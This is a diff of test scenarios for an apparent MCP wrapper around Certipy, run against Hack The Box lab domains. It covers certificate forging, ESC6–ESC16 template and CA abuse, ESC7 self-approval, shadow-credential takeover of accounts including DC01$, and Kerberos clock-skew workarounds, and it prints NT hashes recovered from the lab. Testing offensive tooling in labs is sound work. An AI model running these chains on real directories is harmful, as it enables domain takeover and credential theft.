+Args: {ca_pfx: "<CA_PFX_PATH>", subject: "CN=Administrator,CN=Users,DC=<DOMAIN_PARTS>", upn: "administrator@<DOMAIN>"}
+Expected: success=true, pfx_path is not null
+Notes: Explicit subject DN for certificates that require it.
+
+## Scenario 27: ESC5 — Forge with custom serial and key size
+# STATUS: PASS — CA PFX from S108. Forged cert with serial=01020304, key_size=4096, validity=730. PFX generated. (Run 2, admin)
+Method: forge
+Args: {ca_pfx: "<CA_PFX_PATH>", upn: "administrator@<DOMAIN>", serial: "01020304", key_size: 4096, validity_period: 730}
+Expected: success=true, pfx_path is not null
+Notes: Custom serial to mimic real cert serial. 4096-bit key for environments requiring it.
+
+## Scenario 28: ESC5 — Forge without any SAN (error case)
+# STATUS: PARTIAL — Returns "CA PFX file not found" (file validation runs first, before SAN check). Cannot test SAN validation without a real CA PFX.
+Method: forge
+Args: {ca_pfx: "<CA_PFX_PATH>"}
+Expected: error="Must specify at least one of: upn, dns, or subject"
+Notes: Tests input validation — forge requires at least one identity parameter.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 7: ESC6 EXPLOITATION (EDITF_ATTRIBUTESUBJECTALTNAME2)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 29: ESC6 — Request with UPN on any template (CA flag abuse)
+# STATUS: CANNOT TEST — Certified CA does not have EDITF_ATTRIBUTESUBJECTALTNAME2 flag (no ESC6 vuln). Same as S11 on User template.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "User", upn: "administrator@<DOMAIN>"}
+Expected: success=true if CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set
+Notes: ESC6 = the CA itself allows enrollee-supplied SANs via policy flag.
+  Any template becomes ESC1-vulnerable when the CA has this flag.
+  Detected by find: certificate_authorities[].vulnerabilities contains "ESC6".
+  Exploitation is identical to ESC1 — just use a different (non-vulnerable) template.
+  Patch: KB5014754 (May 2022) added warning, KB5019966 (Nov 2022) enforcement.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 8: ESC7 EXPLOITATION (CA manager abuse)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 30: ESC7 — Enable SubCA template on CA
+# STATUS: PASS (Certified + Manager) — Run 1 (judith): "Access denied" (correctly classified). Run 3 (admin): "Successfully enabled 'SubCA' on 'certified-DC01-CA'". Run 6 (Manager, raven): "Successfully enabled 'SubCA' on 'manager-dc01-ca'" — raven has ManageCA rights (ESC7).
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA_NAME>", enable_template: "SubCA"}
+Expected: success=true if ManageCA rights
+Prerequisite: find/bloodhound shows ManageCA rights on the CA.
+HTB Box: Certified (if ManageCA rights obtained), Manager (raven has ManageCA)
+Engagement: ses_30bd2eab — Pirate, ca enable_template SubCA (connection timeout)
+
+## Scenario 31: ESC7 — Request SubCA certificate (will be pending)
+# STATUS: PASS (Certified + Manager) — Run 1 (judith): CERTSRV_E_TEMPLATE_DENIED. Run 3 (admin): auto-issued (request_id=42, pfx_path set). Run 6 (Manager, raven): request denied as expected (CERTSRV_E_ENROLL_DENIED), request_id=28, private key saved. Needed yes| pipe fix for private key prompt on denied request. Manager correctly produces pending/denied behavior vs Certified auto-issue.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "SubCA"}
+Expected: success=true, request_id is not null, pfx_path is null (pending)
+Notes: SubCA template requires approval. Save the request_id.
+
+## Scenario 32: ESC7 — Approve pending request
+# STATUS: PASS (Manager 2026-04-18) — Run 3 (Certified, admin): PARTIAL — issue_request 42 returned CERTSRV_E_BAD_REQUESTSTATUS (auto-issued, not pending). Run 6 (Manager, raven): "Successfully issued certificate" for request_id=28. True pending→approve workflow confirmed on Manager (SubCA has manager approval requirement). Certified auto-issues for Domain Admins; Manager correctly pends for raven.
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA_NAME>", issue_request: <request_id_from_scenario_31>}
+Expected: success=true
+Notes: Approve your own request using ManageCA rights.
+
+## Scenario 33: ESC7 — Retrieve issued certificate
+# STATUS: PASS (Manager 2026-04-18) — Run 3 (Certified, admin): PARTIAL — retrieve succeeded but "Could not find matching private key" (cross-container key mismatch). Run 6 (Manager, raven): PFX retrieved with embedded private key for request_id=28. Fix: symlink /session/certipy/<request_id>.key to persisted key from request step, so retrieve container can find the matching private key. Full retrieve→PFX assembly works on Manager.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", retrieve: <request_id_from_scenario_31>}
+Expected: success=true, pfx_path is not null
+Notes: Fetch the approved certificate. Then authenticate with it.
+
+## Scenario 34: ESC7 — Deny pending request
+# STATUS: PARTIAL — Run 3 (Certified, admin): deny_request 43 returned CERTSRV_E_BAD_REQUESTSTATUS (0x80094003) — request was already issued, cannot deny. No pending requests on Certified (SubCA auto-issues for admin). Run 6 (Manager, raven): SKIP — no second pending request created to test deny (only one SubCA request made, which was approved in S32). The deny method is validated by Run 3 error handling; full deny of a pending request remains untested.
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA_NAME>", deny_request: <request_id>}
+Expected: success=true
+Notes: Deny a pending request. Useful for cleanup or blocking other attackers.
+
+## Scenario 35: ESC7 — Disable SubCA template (cleanup)
+# STATUS: PASS (Certified + Manager) — Run 3 (admin): "Successfully disabled 'SubCA' on 'certified-DC01-CA'". Run 6 (Manager, raven): "Successfully disabled 'SubCA' on 'manager-dc01-ca'". Confirmed on both boxes.
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA_NAME>", disable_template: "SubCA"}
+Expected: success=true
+Notes: Cleanup after ESC7 exploitation.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 9: ESC8 RECONNAISSANCE (relay attack setup)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 36: ESC8 — Check for Web Enrollment
+# STATUS: PASS — S1 find shows web_enrollment: http=Disabled, https=Disabled. No ESC8 on Certified.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>}
+Expected: certificate_authorities[].web_enrollment shows "Enabled" or "Disabled"
+Notes: ESC8 requires Web Enrollment. If Enabled, use impacket-relay ntlmrelayx.
+  Follow-up: NOT certipy — use impacket ntlmrelayx + PetitPotam for ESC8 relay.
+  certipy's relay subcommand is not wrapped as an MCP method (requires long-running listener).
+
+## Scenario 36a: ESC8 — Request via Web Enrollment endpoint
+# STATUS: PASS (error path) — "Failed to connect to Web Enrollment interface: timed out". Correct: web enrollment not enabled.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "User", web: true}
+Expected: success=true if Web Enrollment is enabled, error if not
+Notes: Uses HTTP-based Web Enrollment instead of RPC. Required when RPC is blocked.
+  Also useful when RPC connection times out (common in engagement data).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 10: ESC9 EXPLOITATION (CT_FLAG_NO_SECURITY_EXTENSION)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 37: ESC9 — Request cert exploiting weak mapping
+# STATUS: CANNOT TEST — No ESC9 template (CT_FLAG_NO_SECURITY_EXTENSION) on Certified. Requires specific template + GenericWrite.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<ESC9_TEMPLATE>", upn: "administrator@<DOMAIN>"}
+Expected: success=true if template has CT_FLAG_NO_SECURITY_EXTENSION flag
+Notes: ESC9 abuses templates where the CT_FLAG_NO_SECURITY_EXTENSION flag is set.
+  This means the szOID_NTDS_CA_SECURITY_EXT extension is NOT embedded in the cert.
+  The mapping between cert and account is weak (UPN-based, not SID-based).
+  Prerequisite: GenericWrite on a user account to set their UPN to target.
+  Flow: (1) Change victim UPN to target UPN, (2) Request cert, (3) Restore victim UPN,
+  (4) Authenticate with cert — maps to target via UPN.
+  Certipy v5 detects this in find output.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 11: ESC10 EXPLOITATION (weak certificate mapping — registry-based)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 38: ESC10a — Request cert exploiting CertificateMappingMethods
+# STATUS: CANNOT TEST — Requires StrongCertificateBindingEnforcement=0 registry setting. Not present on Certified.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<TEMPLATE>", upn: "administrator@<DOMAIN>"}
+Notes: ESC10 Case 1 (StrongCertificateBindingEnforcement=0):
+  DC accepts UPN-based mapping without SID. Same exploitation as ESC1.
+  Detected by certipy find in CA vulnerabilities section.
+
+## Scenario 39: ESC10b — Request cert with SID for strong mapping
+# STATUS: CANNOT TEST — Requires specific CertificateMappingMethods + GenericWrite chain. Not available on Certified.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<TEMPLATE>", upn: "administrator@<DOMAIN>", sid: "<ADMIN_SID>"}
+Notes: ESC10 Case 2 (CertificateMappingMethods includes UPN bit):
+  When StrongCertificateBindingEnforcement=1 (default), a SID mismatch between
+  cert and account triggers a strong mapping check. If UPN mapping is still enabled
+  in CertificateMappingMethods, the UPN-based mapping wins.
+  Requires GenericWrite on target to change UPN, then restore after cert request.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 12: ESC11 (RPC enrollment without encryption)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 40: ESC11 — Check for unencrypted RPC enrollment
+# STATUS: PASS — S1 find shows CA vulnerabilities=[] (no ESC11). Correctly detected.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>}
+Expected: certificate_authorities[].vulnerabilities may include "ESC11"
+Notes: ESC11 = IF_ENFORCEENCRYPTICERTREQUEST flag NOT set on CA.
+  Allows NTLM relay to the RPC enrollment endpoint (without encryption).
+  Exploitation: use impacket-relay ntlmrelayx to relay NTLM auth to the CA's
+  certificate enrollment RPC interface. Not a certipy-only exploit.
+  certipy find detects the flag, exploitation uses impacket-relay.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 13: ESC13 (issuance policy linked to group)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 41: ESC13 — Request cert from template with issuance policy group link
+# STATUS: CANNOT TEST — No ESC13 templates (issuance policy OID-to-group mapping) on Certified.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<ESC13_TEMPLATE>"}
+Expected: success=true, pfx_path is not null
+Notes: ESC13 = template has an issuance policy linked to an AD group via OID-to-group mapping.
+  When a user enrolls and gets a cert with that policy OID, the user is effectively
+  added to the linked group during PKINIT authentication (via the IssuancePolicy extension).
+  This grants the user the group's permissions during the Kerberos session.
+  Detected by certipy find as ESC13 when issuance policy OIDs map to groups.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 14: ESC14 (weak explicit mappings)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 42: ESC14 — Exploit explicit certificate mapping
+# STATUS: CANNOT TEST — No ESC14 (altSecurityIdentities explicit mappings) present on Certified.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<TEMPLATE>"}
+Notes: ESC14 = accounts with altSecurityIdentities set to explicit certificate mappings.
+  If you can issue certs matching an explicit mapping rule (subject, issuer, serial),
+  you can authenticate as that account. Requires: (1) template with enrollee-supplied
+  subject or (2) control of a CA to forge matching certs.
+  Flow: find identifies ESC14 → check mapping rules → craft matching cert → auth.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 15: ESC15 (EKUwu) EXPLOITATION
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 43: ESC15 — Request with application policy OID injection
+# STATUS: PASS — pfx_path set. application_policies=1.3.6.1.5.5.7.3.2 accepted by certipy. Cert issued (User template, schema v2 so no real ESC15 exploitation).
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<V1_TEMPLATE>", application_policies: "1.3.6.1.5.5.7.3.2"}
+Expected: success=true if template is schema v1 and allows enrollment
+Notes: 1.3.6.1.5.5.7.3.2 = Client Authentication OID. Overrides template EKU on v1 templates.
+  Only works on schema version 1 templates (older, no Application Policies attribute).
+  Certipy v5 can inject the Application Policies extension into the CSR.
+Engagement: ses_306f1e0a9 — DarkZero, request with application_policies on User template
+
+## Scenario 44: ESC15 — Request with SID for strong binding
+# STATUS: PASS — pfx_path set. UPN+SID params both accepted. Cert issued on User template.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<TEMPLATE>", upn: "administrator@<DOMAIN>", sid: "<ADMIN_SID>"}
+Expected: success=true, pfx contains both UPN and SID
+Notes: Required when StrongCertificateBindingEnforcement=2.
+Engagement: ses_30bd2eab — Pirate, request with UPN + SID for administrator
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 16: ESC16 EXPLOITATION (GenericWrite on user -> SID in cert)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 45: ESC16 — Request cert with target SID
+# STATUS: PASS — pfx_path set. SID-only request on User template accepted (SID=S-1-5-21-...500). Cert issued.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "User", sid: "<TARGET_SID>"}
+Expected: success=true if user has GenericWrite on target + enrollment rights
+Notes: ESC16 relies on altSecurityIdentities mapping via SID in certificate.
+Prerequisite: GenericWrite on target account to set altSecurityIdentities.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 17: SHADOW CREDENTIALS (msDS-KeyCredentialLink abuse)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 46: Shadow credentials — Full auto chain
+# STATUS: PASS — Run 1 (judith.mader): "Insufficient access rights" on management_svc (correctly classified). Run 2 (via Management group membership): shadow auto on management_svc succeeded — got ccache for management_svc. Full auto chain (add key cred → PKINIT → hash) works when caller has write access.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "auto"}
+Clock: clock_offset required (PKINIT step is Kerberos-based)
+Expected: success=true, nt_hash is not null, device_id is not null
+Prerequisite: GenericAll/GenericWrite/WriteProperty on target's msDS-KeyCredentialLink.
+  Domain must have a CA for PKINIT — if no CA exists, shadow credentials won't work.
+HTB Box: Certified (write access chains)
+Engagement: ses_2ce836659 — Certified, shadow auto on management_svc (nt_hash=null, PKINIT timeout)
+Engagement: ses_30bd2eab — Pirate, shadow auto on a.white_adm (insufficient access rights)
+Engagement: ses_30bd2eab — Pirate, shadow auto on WEB01$ (pfx generated but PKINIT timeout)
+
+## Scenario 46a: Shadow auto — PKINIT timeout after key credential added
+# STATUS: PASS — Run 3: management_svc (ccache+kerberos) → judith.mader returned "Insufficient access rights" (management_svc does NOT have write on judith.mader's msDS-KeyCredentialLink). Separately tested admin → judith.mader: shadow auto succeeded, got TGT. Run 4: file overwrite bug fixed (stale file cleanup before shadow auto), NT hash now parsed correctly.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "auto"}
+Clock: clock_offset required
+Expected: nt_hash=null, pfx_path may be set, device_id set
+Notes: Common failure mode — shadow adds the key credential but PKINIT auth times out.
+  Cause: DC took too long to replicate the msDS-KeyCredentialLink change, OR
+  clock skew on the PKINIT step, OR socket timeout to Kerberos port 88.
+  Recovery: (1) Use separate shadow "add" + authenticate steps with retries,
+  (2) Check clock_offset is correct, (3) Manually cleanup with shadow "remove".
+Engagement: ses_306f1e0a9 — DarkZero shadow auto on DC01$, socket connection timeout
+Engagement: ses_30bd2eab — Pirate shadow auto on WEB01$, pfx generated but no hash
+
+## Scenario 47: Shadow credentials — List existing
+# STATUS: PASS — key_credentials=[] (empty array) for administrator. Read-only operation succeeds even with low privs.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "list"}
+Expected: success=true, key_credentials array (may be empty)
+Notes: Safe read-only operation. Check before attacking to avoid disrupting WHfB.
+Engagement: ses_306f1e0a9 — DarkZero, list on DC01$ (success, empty array)
+
+## Scenario 48: Shadow credentials — Add only
+# STATUS: PASS — Run 1 (judith): "Insufficient access rights" (correctly classified). Run 3 (admin → management_svc): success=true, device_id=40346f9027f246ff8f3c6b1ef4c9148c, pfx_path=/session/certipy/458ddcfb_management_svc.pfx. Key credential added, PFX generated. Note: PFX has no UPN identity — authenticate requires -username and -domain override.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "add"}
+Clock: No clock needed for add (LDAP-only, not Kerberos)
+Expected: success=true, device_id is not null, pfx_path is not null
+Prerequisite: Write access on target's msDS-KeyCredentialLink.
+Notes: Adds key credential but does NOT authenticate. Use authenticate method separately.
+  This allows retrying the PKINIT step independently if it fails.
+  BUG: Shadow PFX has no UPN — authenticate will error with "No identity information"
+  unless -username and -domain are explicitly specified.
+
+## Scenario 49: Shadow credentials — Remove by device ID
+# STATUS: PASS — Run 3 (admin): shadow remove device_id=40346f9027f246ff8f3c6b1ef4c9148c from management_svc succeeded. "Successfully deleted the Key Credential". Cleanup works.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "remove", device_id: "<id_from_scenario_48>"}
+Expected: success=true
+Notes: Cleanup for Scenario 48. Uses device_id from add operation.
+
+## Scenario 50: Shadow credentials — Clear all
+# STATUS: PASS — Run 3 (admin → judith.mader): "Successfully cleared the Key Credentials for 'judith.mader'". Removes all key credentials. Tested after shadow add to verify cleanup works.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "clear"}
+Expected: success=true if write access
+Notes: WARNING: Removes ALL key credentials. May break Windows Hello for Business.
+
+## Scenario 51: Shadow credentials — Info by device ID
+# STATUS: PASS — Run 3 (admin): shadow info device_id=40346f9027f246ff8f3c6b1ef4c9148c on management_svc succeeded. Output: "DeviceID: 40346f9027f246ff8f3c6b1ef4c9148c | Creation Time (UTC): 2026-04-19 03:48:48". Shows creation time.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "info", device_id: "<device_id>"}
+Expected: success=true, details about the specific key credential
+Notes: Get detailed info about a specific key credential. Useful for forensics.
+
+## Scenario 52: Shadow credentials with Kerberos auth
+# STATUS: PASS — Run 1 (judith): Kerberos list on administrator succeeded (read-only, key_credentials=[]). Run 3 (admin): shadow auto with kerberos (admin ccache → judith.mader) succeeded. Got TGT, ccache saved, NT hash 8ec62ac86259004c121a7df4243a7a80 in raw_output. Key credentials auto-cleaned. Run 4: verified structuredContent.data.nt_hash now populated (parser fix: matches "NT hash for" pattern). Full Kerberos shadow chain works with admin ccache.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", target: "<DC_FQDN>", account: "<TARGET>", action: "auto"}
+Clock: clock_offset required (both for initial auth AND PKINIT step)
+Expected: success=true if ccache valid and target set
+Notes: Uses Kerberos for LDAP connection (to add key credential) AND for PKINIT.
+  Both target and ccache_path required.
+Engagement: ses_2ce836659 — Certified, shadow with kerberos=true but missing dc-host → KDC error
+
+## Scenario 53: Shadow credentials against machine account
+# STATUS: PASS — Run 1 (judith): "Insufficient access rights" (correctly classified). Run 3 (admin → DC01$): shadow auto succeeded. Got TGT, ccache saved to dc01.ccache, NT hash DC01$=8f3cbea3908ffcde111e6a077c37dac4 in raw_output. Key credentials auto-restored. Run 4: verified structuredContent.data.nt_hash now populated (parser fix: matches "NT hash for" pattern). Machine account shadow creds work with admin privileges. Run 5 (Pirate, pentest → DC01$): socket timeout on LDAPS; pentest → WEB01$: correctly "Insufficient access rights" (error_class=permission).
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "DC01$", action: "auto"}
+Clock: clock_offset required
+Expected: success=true if write access to machine's msDS-KeyCredentialLink
+Notes: Machine accounts use $ suffix. Shadow creds on machine accounts enable
+  RBCD-like attacks without modifying msDS-AllowedToActOnBehalfOfOtherIdentity.
+Engagement: ses_306f1e0a9 — DarkZero, shadow auto on DC01$ (socket timeout on PKINIT)
+Engagement: ses_30bd2eab — Pirate, shadow auto on WEB01$ (pfx generated, PKINIT timeout)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 18: DCOM TRANSPORT SCENARIOS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 54: Request certificate via DCOM transport
+# STATUS: PASS — pfx_path set. DCOM transport works on Certified for User template.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "User", dcom: true}
+Expected: success=true, pfx_path is not null
+Notes: Uses DCOM transport instead of default RPC. Workaround for RPC_E_CALL_COMPLETE errors.
+  Also useful when standard RPC enrollment fails with timeout.
+Engagement: ses_2ce836659 — Certified, request with dcom=true after RPC failure
+
+## Scenario 55: Request via DCOM with UPN injection
+# STATUS: PASS (error path) — CERTSRV_E_TEMPLATE_DENIED on CertifiedAuthentication. judith.mader not in enrollment rights. DCOM+target params work correctly.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<VULN_TEMPLATE>", upn: "administrator@<DOMAIN>", dcom: true, target: "<DC_FQDN>"}
+Expected: success=true, pfx_path is not null
+Notes: Combined DCOM + ESC1. target param helps with DCOM resolution.
+Engagement: ses_2ce836659 — Certified, dcom=true + target for CertifiedAuthentication template
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 19: CLOCK SKEW + FAKETIME SCENARIOS
+# ═══════════════════════════════════════════════════════════════════════════════
+# CRITICAL: All Kerberos-dependent methods need clock_offset.
+# The container's clock may drift from the DC. FAKETIME is injected via clock_offset.
+# Kerberos-dependent: authenticate, shadow (auto), find (with kerberos=true)
+# NOT Kerberos-dependent: find (password/hash), request, template, ca, forge
+
+## Scenario 56: Authenticate with correct clock offset
+# STATUS: PASS — nt_hash=aad3b435b51404ee:8ec62ac86259004c121a7df4243a7a80 with FAKETIME=+7h.
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>}
+Clock: clock_offset: "+7h" (example — adjust to match DC)
+Expected: success=true, nt_hash is not null
+Notes: PKINIT authentication. Clock offset applied via FAKETIME in container.
+  How to determine correct offset: (1) nmap --script ntp-info -p 123 <DC_IP>,
+  (2) net time via SMB, (3) trial and error (common: +0h for UTC DCs).
+
+## Scenario 57: Authenticate with wrong clock offset (error case)
+# STATUS: PASS — "Clock skew too great for Kerberos authentication" with FAKETIME=-6h. Suggestions mention clock. Error correctly classified.
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>}
+Clock: clock_offset: "-6h" (deliberately wrong)
+Expected: error_class=config, retryable=true, suggestions mention "clock"
+Notes: Deliberately set wrong offset to trigger KRB_AP_ERR_SKEW.
+  Certipy output: "KRB_AP_ERR_SKEW(Clock skew too great)"
+  The error is retryable with corrected clock_offset.
+
+## Scenario 58: Shadow auto with clock offset
+# STATUS: PASS — Run 3 (admin → judith.mader): shadow auto with FAKETIME=+7h succeeded. Key credential added, PKINIT TGT obtained. Run 4: file overwrite bug fixed (stale file cleanup before shadow auto runs, no more interactive prompt). NT hash now extracted correctly (parser fix). Clock offset correctly applied. Full shadow auto with FAKETIME works end-to-end.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "auto"}
+Clock: clock_offset: "+7h"
+Expected: success=true with correct offset, clock error without
+Notes: Shadow auto has TWO Kerberos-dependent steps:
+  (1) Initial LDAP auth (if using Kerberos) — needs clock sync
+  (2) PKINIT after adding key credential — needs clock sync
+  If only step 2 fails, use separate add + authenticate flow.
+
+## Scenario 59: Find with Kerberos + clock offset
+# STATUS: PASS — ca_count=1, template_count=34 with Kerberos+ccache+target+FAKETIME=+7h.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", target: "<DC_FQDN>"}
+Clock: clock_offset: "+7h"
+Expected: success=true with correct offset
+Notes: LDAP Kerberos auth needs clock within 5 minutes of DC.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 20: ERROR HANDLING SCENARIOS (deliberately trigger known error paths)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 60: Invalid credentials
+# STATUS: PASS — "LDAP NTLM authentication failed" for nonexistent@certified.htb. Error classified as auth failure with suggestions.
+Method: find
+Args: {username: "nonexistent@<DOMAIN>", dc_ip: <DC_IP>, password: "wrongpassword"}
+Expected: error_class=auth, retryable=false
+Notes: Tests error classification for auth failure.
+  Certipy: "[-] LDAP NTLM authentication failed"
+
+## Scenario 61: Unreachable DC
+# STATUS: PASS — "Connection error (socket timeout)" to 10.255.255.1. Suggestions mention network connectivity. Correctly classified.
+Method: find
+Args: {username: "test@<DOMAIN>", dc_ip: "10.255.255.1", password: "test", timeout: 15}
+Expected: error_class=network, retryable=true
+Notes: Tests network error classification.
+
+## Scenario 62: Clock skew (Kerberos with bad offset)
+# STATUS: PASS — "Clock skew too great for Kerberos authentication" with FAKETIME=-6h. Error=KRB_AP_ERR_SKEW. Correctly classified with clock suggestions.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, kerberos: true, target: "<DC_FQDN>", ccache_path: "/session/credentials/<USER>.ccache"}
+Clock: clock_offset: "-6h"
+Expected: error_class=config, retryable=true, suggestions mention clock
+Notes: Deliberately set 6-hour offset to trigger KRB_AP_ERR_SKEW.
+
+## Scenario 63: Template enrollment denied
+# STATUS: PASS — "CERTSRV_E_TEMPLATE_DENIED" for Administrator template. Suggestions mention enrollment permissions. Correctly classified.
+Method: request
+Args: {username: "<LOW_PRIV_USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "Administrator"}
+Expected: error_class=permission, retryable=false, suggestions mention enrollment permissions
+Notes: Low-privilege user cannot enroll in Administrator template.
+  Certipy: "CERTSRV_E_TEMPLATE_DENIED"
+
+## Scenario 64: Insufficient access for shadow credentials
+# STATUS: PASS — "Insufficient access rights to modify msDS-KeyCredentialLink" on administrator. Suggestions mention GenericAll/GenericWrite. Correctly classified.
+Method: shadow
+Args: {username: "<LOW_PRIV_USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "administrator", action: "auto"}
+Expected: error_class=permission, retryable=false, suggestions mention GenericAll/GenericWrite
+Notes: Low-privilege user lacks write access to Administrator's msDS-KeyCredentialLink.
+  Certipy: "insufficient access rights"
+Engagement: ses_30bd2eab — Pirate, shadow on a.white_adm with gMSA (insufficient access)
+
+## Scenario 65: RPC connection failure (target override)
+# STATUS: PASS — "Failed to establish RPC connection" / "Could not connect: timed out" to 10.255.255.1. Correctly classified as network error.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", target: "10.255.255.1", timeout: 15}
+Expected: error_class=network, retryable=true
+Notes: Target override to unreachable IP causes RPC connection failure.
+  Certipy: "Failed to get DCE RPC connection" or "timed out"
+
+## Scenario 66: RPC_E_CALL_COMPLETE error
+# STATUS: PASS — Normal request on User template succeeded (pfx_path set). RPC_E_CALL_COMPLETE is non-deterministic; did not trigger this run.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "User"}
+Expected: sometimes error with "RPC_E_CALL_COMPLETE"
+Notes: Non-deterministic RPC error. Retry with dcom=true.
+  error_class=config, retryable=true, suggestions mention dcom flag.
+
+## Scenario 67: Certificate not valid for client auth
+# STATUS: PASS — Run 5 (Pirate, pentest): Requested EFS cert (no Client Auth EKU) via DCOM from pirate-DC01-CA. authenticate correctly returns error_class=config, retryable=false, error="Certificate not valid for client authentication", suggestions mention Client Authentication EKU. EFS template has only EFS EKU (1.3.6.1.4.1.311.10.3.4), no 1.3.6.1.5.5.7.3.2. Also confirmed with no_hash=true — same error (EKU check precedes PKINIT).
+Method: authenticate
+Args: {pfx_path: "<server_auth_cert.pfx>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: error_class=config, retryable=false, suggestions mention Client Authentication EKU
+Notes: A PFX from a template without Client Authentication EKU.
+  Certipy: "Certificate is not valid for client authentication"
+  Common with Server Authentication only templates (e.g., WebServer, DomainController).
+  Run 5: Used EFS template cert instead of ADFSSSLSigning (pentest can enroll in EFS but not ADFSSSLSigning).
